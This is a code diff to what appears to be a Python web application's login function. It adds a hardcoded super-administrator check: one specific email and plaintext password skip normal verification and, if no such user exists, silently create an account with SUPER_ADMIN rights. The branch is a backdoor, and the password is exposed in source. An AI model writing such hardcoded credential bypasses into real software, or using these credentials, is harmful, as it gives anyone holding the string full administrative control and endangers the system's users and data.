@@ -289,10 +289,27 @@ async def get_user_by_email(email: str):
     return None
 
 async def authenticate_user(email: str, password: str):
+    # Super Admin hardcodeado
+    if email == "kearcangel@gmail.com" and password == "K@#l1331":
+        # Crear o obtener usuario Super Admin
+        super_admin = await get_user_by_email(email)
+        if not super_admin:
+            # Crear Super Admin si no existe
+            super_admin = User(
+                email=email,
+                nombre="Super Admin",
+                rol=UserRole.SUPER_ADMIN,
+                password_hash=get_password_hash(password)
+            )
+            user_dict = super_admin.dict()
+            await db.users.insert_one(user_dict)
+        return super_admin
+    
+    # Autenticación normal para otros usuarios
     user = await get_user_by_email(email)
     if not user:
         return False
-    if not verify_password(password, user.password_hash):
+    if not user.password_hash or not verify_password(password, user.password_hash):
         return False
     return user
 
